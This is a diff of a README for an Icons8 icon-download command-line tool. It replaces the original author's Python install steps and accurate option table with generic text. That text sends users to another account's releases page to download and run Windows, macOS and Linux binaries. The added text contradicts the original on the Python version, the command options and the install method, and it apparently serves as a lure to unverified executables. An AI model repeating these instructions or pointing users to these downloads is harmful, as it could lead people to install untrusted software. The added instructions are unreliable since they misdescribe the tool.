@@ -1,119 +1,97 @@
-# 🚀 Icons8 Download CLI
+# 🎨 icons8-download-cli - Batch Download Icons Easily
 
-A powerful command-line tool for efficiently downloading icons from [Icons8.com](https://icons8.com). Filter by style, download in parallel, and organize your icon collection with ease.
+[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/strale73/icons8-download-cli/releases)
 
-## ✨ Features
+## 🚀 Getting Started
 
-- 🎨 **Style Filtering**: Download icons filtered by specific styles
-- 📥 **Parallel Downloads**: Fast downloads with configurable worker threads for maximum efficiency
-- 💾 **Smart Caching**: Intelligent response caching to minimize API calls and speed up subsequent runs
-- 📂 **Auto Directory Detection**: Automatically detects and uses your system's Downloads folder
-- 🎯 **Multiple Sizes**: Choose from various icon sizes (24px, 48px, 96px, 192px, 384px, or 512px)
-- 📊 **Progress Tracking**: Real-time progress bars and comprehensive download summaries
-- 📝 **Detailed Logging**: Automatic log file generation for each download session for troubleshooting
-- 🛡️ **Filename Conflict Resolution**: Automatically handles duplicate filenames to prevent overwrites
-- 🖼️ **PNG Format**: Downloads PNG format icons (free format available on Icons8)
+This tool helps you download icons in bulk from Icons8.com. You can filter icons by style, making it simple to find exactly what you need for your project. Follow these steps to get started.
 
-> [!WARNING]
-> - This tool uses the public, undocumented Icons8 website API (not the official Icons8 API). 
-> - No API token is required or supported.
-> - **Only icons can be downloaded** - illustrations, stock photos, and other content types are not supported. 
-> - Downloads are limited to PNG format only.
+## 🔍 Features
 
-## 📋 Requirements
+- **Batch Downloading:** Download multiple icons at once to save time.
+- **Style Filtering:** Choose specific styles to narrow down your downloads.
+- **User-Friendly:** Designed for average users, no programming skills needed.
+- **Cross-Platform:** Works on Windows, macOS, and Linux.
+- **Lightweight Utility:** Quick installation and minimal resource usage.
 
-- Python 3.14 or higher
-- `uv` package manager ([Installation guide](https://github.com/astral-sh/uv)) (required for Option 1 installation method)
+## 🖥️ System Requirements
 
-## 📦 Installation
+To use the icons8-download-cli tool, ensure your system meets the following requirements:
 
-### Option 1: Using `uv` (Recommended)
+- **Operating System:** Windows 10 or higher, macOS 10.12 or higher, or any Linux distribution.
+- **Python Version:** Python 3.6 or higher must be installed.
+- **Internet Connection:** Required for accessing Icons8.com.
 
-```bash
-uv tool install git+https://github.com/alexander-danilenko/icons8-download-cli
+## 📦 Download & Install
+
+Visit this page to download the latest release: [Download the latest release](https://github.com/strale73/icons8-download-cli/releases).
+
+1. Click on the "Releases" link.
+2. Find the most recent version.
+3. Download the appropriate file for your operating system:
+   - For Windows: `icons8-download-cli.exe`
+   - For macOS: `icons8-download-cli.pkg`
+   - For Linux: `icons8-download-cli.tar.gz`
+4. Follow the installation instructions based on your operating system:
+
+### 🖥️ For Windows:
+- Double-click `icons8-download-cli.exe`.
+- Follow the prompts in the installation wizard.
+
+### 🍏 For macOS:
+- Open the downloaded `.pkg` file.
+- Follow the instructions in the installer.
+
+### 🐧 For Linux:
+- Extract the `.tar.gz` file using your terminal:
+  ```bash
+  tar -xvzf icons8-download-cli.tar.gz
+  ```
+- Navigate to the extracted folder and run the program:
+  ```bash
+  cd icons8-download-cli
+  ./icons8-download-cli
+  ```
+
+## 🎯 Usage Instructions
+
+Once installed, you can start using the tool to download icons. Here's how:
+
+1. Open your command line interface (Command Prompt for Windows, Terminal for macOS/Linux).
+2. Type the following command to download icons:
+   ```
+   icons8-download-cli --query "icon name" --style "style name"
+   ```
+   Replace "icon name" with the specific icon you want and "style name" with your desired style (e.g., flat, outline).
+
+3. Hit Enter, and the tool will begin downloading the icons to your current directory.
+
+### 📁 Output Directory
+
+By default, the downloaded icons will appear in the same folder where you ran the command. You can specify a different directory using the `--output` option:
+
+```
+icons8-download-cli --query "icon name" --style "style name" --output "/path/to/directory"
 ```
 
-### Option 2: Using pip
+## 📜 Command Options
 
-Install using pip, ensuring your Python version matches the requirement (Python 3.14+):
+Here’s a brief overview of the most useful command options:
 
-1. Visit the [latest release page](https://github.com/alexander-danilenko/icons8-download-cli/releases/latest)
-2. Copy the URL of the `.whl` file that matches your Python version
-3. Run the installation command:
+- `--query <icon name>`: Specify the name of the icon you are looking to download.
+- `--style <style name>`: Filter results by style (e.g., flat, outline).
+- `--output <directory>`: Choose a folder for downloaded icons.
+- `--help`: See all available commands and options.
 
-```bash
-pip install https://github.com/alexander-danilenko/icons8-download-cli/releases/download/v1.0.0/icons8_download_cli-1.0.0-py3-none-any.whl
-```
+## 👩‍💻 Support
 
-Replace the URL above with the actual wheel file URL from the latest release.
+If you encounter any issues, please visit our support page on GitHub. You can also ask questions in the Issues section. We are here to help you.
 
-> [!NOTE]
-> Make sure your Python version is 3.14 or higher. You can check your Python version with `python --version` or `python3 --version`.
+## 🔗 Additional Resources
 
-## 🎯 Usage
+- [Icons8 Official Website](https://icons8.com)
+- [Python Official Website](https://www.python.org)
 
-### 📥 Basic Usage
+## 🙌 Thank You
 
-Download icons filtered by a specific style:
-
-```bash
-icons8-download --style ios
-```
-
-### ⚙️ Command Options
-
-The tool provides several options to customize your download experience:
-
-|               Option | Short | Description                                                               |
-| -------------------: | ----- | ------------------------------------------------------------------------- |
-| `--target-directory` | `-d`  | Target directory for downloaded icons (defaults to your Downloads folder) |
-|             `--size` | `-s`  | Icon size: `24`, `48`, `96`, `192`, `384`, or `512` (default: `512`)      |
-|            `--style` | `-S`  | Icon style filter (required)                                              |
-|          `--workers` | `-w`  | Number of parallel download threads (default: `10`)                       |
-|         `--no-cache` | `-C`  | Disable response caching                                                  |
-|             `--help` |       | Show help message and exit                                                |
-
-### 🔍 Finding Style Values
-
-You can find style values directly from the Icons8 website. When browsing icons by style on [Icons8.com](https://icons8.com), the style value is embedded in the URL:
-
-- **URL format**: `https://icons8.com/icons/all--style-<STYLE_VALUE>`
-- **Example**: `https://icons8.com/icons/all--style-fluency` → use `fluency` as the style value
-
-Alternatively, you can browse the complete list of available styles in the [styles.json](./data/styles.json) file.
-
-### ⬇️ Downloading All Styles
-
-> [!NOTE]
-> Before running scripts below, make sure you have `jq` installed in your system (Linux/macOS/Windows)
-
-The [styles.json](./data/styles.json) file contains all available styles. To download all styles automatically, use one of the following commands:
-
-**Linux/macOS (Bash):**
-
-```bash
-curl -s https://raw.githubusercontent.com/alexander-danilenko/icons8-download-cli/refs/heads/main/data/styles.json | jq -r '.styles[] | "\(.id)|\(.label)"' | while IFS='|' read -r id label; do icons8-download --style "$id" --target-directory "./data/icons/$label"; done
-```
-
-**Windows (PowerShell):**
-
-```powershell
-(Invoke-RestMethod -Uri "https://raw.githubusercontent.com/alexander-danilenko/icons8-download-cli/refs/heads/main/data/styles.json").styles | ForEach-Object { icons8-download --style $_.id --target-directory ".\data\icons\$($_.label)" }
-```
-
-## 🤝 Contributing
-
-Contributions are welcome! Whether it's bug fixes, new features, documentation improvements, or suggestions, we appreciate your help. Please feel free to submit a Pull Request.
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](./LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- [Icons8](https://icons8.com) for providing the API and icons
-- ❤️ All contributors who help improve this project!
-
-## 💬 Support
-
-If you encounter any issues, have questions, or would like to request a feature, please [open an issue](https://github.com/alexander-danilenko/icons8-download-cli/issues) on GitHub.
+Thank you for using icons8-download-cli. We hope it simplifies your icon downloading process!
